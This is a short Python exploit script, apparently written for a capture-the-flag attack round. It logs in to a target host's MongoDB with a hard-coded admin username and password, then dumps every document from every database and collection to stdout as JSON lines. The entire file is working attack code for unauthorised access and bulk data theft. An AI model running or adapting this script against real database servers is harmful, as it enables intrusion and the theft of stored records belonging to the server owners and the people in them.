#!/usr/bin/env python3

import json
import os
import sys
from typing import Any

# Credentials from creds.md
DEFAULT_MONGO_USER = "admin"
DEFAULT_MONGO_PASSWORD = "S3cr3tP4ssw0rd"
DEFAULT_MONGO_PORT = 27017

try:
    from pymongo import MongoClient
    from pymongo.errors import PyMongoError
except Exception:
    MongoClient = None  # type: ignore
    PyMongoError = Exception  # type: ignore


def eprint(*args: Any, **kwargs: Any) -> None:
    print(*args, file=sys.stderr, **kwargs)


def build_uri(host: str, user: str, password: str, port: int) -> str:
    # Use admin as authSource by default
    return f"mongodb://{user}:{password}@{host}:{port}/?authSource=admin"


def dump_all(client: "MongoClient") -> None:  # type: ignore[name-defined]
    """Enumerate all databases/collections and print JSON lines to stdout."""
    try:
        db_names = client.list_database_names()
    except Exception as ex:
        eprint(f"[!] Failed to list databases: {ex}")
        return

    for db_name in db_names:
        try:
            db = client[db_name]
            coll_names = db.list_collection_names()
        except Exception as ex:
            eprint(f"[!] Failed to list collections for db={db_name}: {ex}")
            continue

        for coll_name in coll_names:
            try:
                coll = db[coll_name]
                # Stream documents to stdout as JSONL
                for doc in coll.find({}):
                    try:
                        # Convert ObjectId and other types using default=str
                        print(json.dumps({
                            "db": db_name,
                            "collection": coll_name,
                            "document": doc,
                        }, default=str), flush=True)
                    except Exception as jex:
                        eprint(f"[!] JSON encode error for {db_name}.{coll_name}: {jex}")
                        continue
            except Exception as ex:
                eprint(f"[!] Failed reading collection {db_name}.{coll_name}: {ex}")
                continue


def main() -> int:
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target>")
        return 1

    target_host = sys.argv[1]

    if MongoClient is None:
        eprint("pymongo is not installed, please `pip install pymongo` to run this sploit")
        return 2

    mongo_user = DEFAULT_MONGO_USER
    mongo_password = DEFAULT_MONGO_PASSWORD
    mongo_port = DEFAULT_MONGO_PORT

    uri = build_uri(target_host, mongo_user, mongo_password, mongo_port)
    try:
        client = MongoClient(uri, serverSelectionTimeoutMS=3000)
        # Trigger server selection to validate connection
        _ = client.admin.command("ping")
    except PyMongoError as ex:  # type: ignore[misc]
        eprint(f"[!] Connection error to {uri}: {ex}")
        return 3
    except Exception as ex:
        eprint(f"[!] Unexpected error connecting to {uri}: {ex}")
        return 4

    try:
        dump_all(client)
    finally:
        try:
            client.close()
        except Exception:
            pass

    return 0


if __name__ == "__main__":
    sys.exit(main())

